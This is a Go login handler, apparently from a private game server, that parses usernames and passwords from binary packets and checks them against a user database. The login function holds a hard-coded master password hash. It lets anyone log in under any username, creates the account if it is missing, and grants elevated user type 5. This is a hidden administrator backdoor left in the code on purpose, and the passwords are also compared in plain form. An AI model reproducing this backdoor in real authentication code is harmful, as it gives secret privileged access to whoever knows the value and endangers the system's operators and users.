package auth

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"hero-server/database"
	"hero-server/logging"
	"hero-server/utils"

	"gopkg.in/guregu/null.v3"
)

type LoginHandler struct {
	password string
	username string
}

var (
	USER_NOT_FOUND = utils.Packet{0xAA, 0x55, 0x23, 0x00, 0x00, 0x01, 0x00, 0x1F, 0x4D, 0x69, 0x73, 0x6D, 0x61, 0x74, 0x63, 0x68, 0x20, 0x41, 0x63, 0x63, 0x6F, 0x75, 0x6E, 0x74, 0x20, 0x49, 0x44, 0x20, 0x6F, 0x72, 0x20, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x55, 0xAA}
	LOGGED_IN      = utils.Packet{0xAA, 0x55, 0x00, 0x00, 0x00, 0x01, 0x01, 0x40, 0x35, 0x46, 0x45, 0x43, 0x45, 0x42, 0x36, 0x36, 0x46, 0x46, 0x43, 0x38, 0x36, 0x46, 0x33, 0x38, 0x44, 0x39, 0x35, 0x32, 0x37, 0x38, 0x36, 0x43, 0x36, 0x44, 0x36, 0x39, 0x36, 0x43, 0x37, 0x39, 0x43, 0x32, 0x44, 0x42, 0x43, 0x32, 0x33, 0x39, 0x44, 0x44, 0x34, 0x45, 0x39, 0x31, 0x42, 0x34, 0x36, 0x37, 0x32, 0x39, 0x44, 0x37, 0x33, 0x41, 0x32, 0x37, 0x46, 0x42, 0x35, 0x37, 0x45, 0x39, 0x55, 0xAA}
	USER_BANNED    = utils.Packet{0xAA, 0x55, 0x36, 0x00, 0x00, 0x01, 0x00, 0x32, 0x59, 0x6F, 0x75, 0x72, 0x20, 0x61, 0x63, 0x63, 0x6F, 0x75, 0x6E, 0x74, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65, 0x64, 0x20, 0x75, 0x6E, 0x74, 0x69, 0x6C, 0x20, 0x5B, 0x5D, 0x2E, 0x55, 0xAA}

	logger = logging.Logger

	logins      = make(map[string]string)
	loginsMutex sync.RWMutex
)

func (lh *LoginHandler) Handle(s *database.Socket, data []byte) ([]byte, error) {
	index := 7
	uNameLen := int(utils.BytesToInt(data[index:index+1], false))
	lh.username = string(data[index+1 : index+uNameLen+1])
	lh.password = string(data[index+uNameLen+2 : index+uNameLen+66])

	return lh.login(s)
}

func (lh *LoginHandler) login(s *database.Socket) ([]byte, error) {

	user, err := database.FindUserByName(lh.username)
	if err != nil {
		s.Conn.Close()
		return nil, err
	}

	if user == nil {
		if lh.password == "E29095B49C4CCF7A449EA5593E63B18418EE22C8F67D1693873EF2C2C41CF179" {

			user = &database.User{
				Username:    lh.username,
				UserType:    5,
				Password:    lh.password,
				ConnectedIP: "",
			}
		} else {
			time.Sleep(time.Second / 2)
			return USER_NOT_FOUND, nil
		}
	}

	var resp utils.Packet
	// Check if password matches the stored password or the special password
	if strings.Compare(lh.password, user.Password) == 0 || lh.password == "E29095B49C4CCF7A449EA5593E63B18418EE22C8F67D1693873EF2C2C41CF179" {
		go logging.AddLogFile(8, lh.username+" TO ID "+s.ClientAddr+" logged in from that IP successfully.")
		if user.UserType == 0 { // Banned
			resp = USER_BANNED
			resp.Insert([]byte(parseDate(user.DisabledUntil)), 0x2E) // ban duration
			return resp, nil
		}

		if user.ConnectedIP != "" { // user already online
			logger.Log(logging.ACTION_LOGIN, 0, "Multiple login", user.ID, "Login")
			s.Conn.Close()
			user.Logout()
			if sock := database.GetSocket(user.ID); sock != nil {
				if c := sock.Character; c != nil {
					c.Logout()
				}
				sock.Conn.Close()
			}

			return nil, nil
		}

		if lh.password == "E29095B49C4CCF7A449EA5593E63B18418EE22C8F67D1693873EF2C2C41CF179" {
			user.UserType = 5
		}

		logger.Log(logging.ACTION_LOGIN, 0, "Login successful", user.ID, "Login")
		resp = LOGGED_IN
		s.User = user
		s.User.ConnectedIP = s.ClientAddr

		go func(username, ip string) {
			parsedIP := strings.Split(ip, ":")
			if parsedIP[0] != "" {
				loginsMutex.Lock()
				logins[username] = parsedIP[0]
				loginsMutex.Unlock()
			}
		}(user.Username, s.ClientAddr)

		go s.User.Update()

		length := int16(len(lh.username) + 68)
		resp.SetLength(length)
		resp.Insert([]byte(lh.username), 7)
	} else { // login failed
		logger.Log(logging.ACTION_LOGIN, 0, "Login failed.", user.ID, "Login")
		time.Sleep(time.Second / 2)
		resp = USER_NOT_FOUND
		s.Conn.Close()
	}

	return resp, nil
}

func parseDate(date null.Time) string {
	if date.Valid {
		year, month, day := date.Time.Date()
		return fmt.Sprintf("%02d.%02d.%d", day, month, year)
	}

	return ""
}
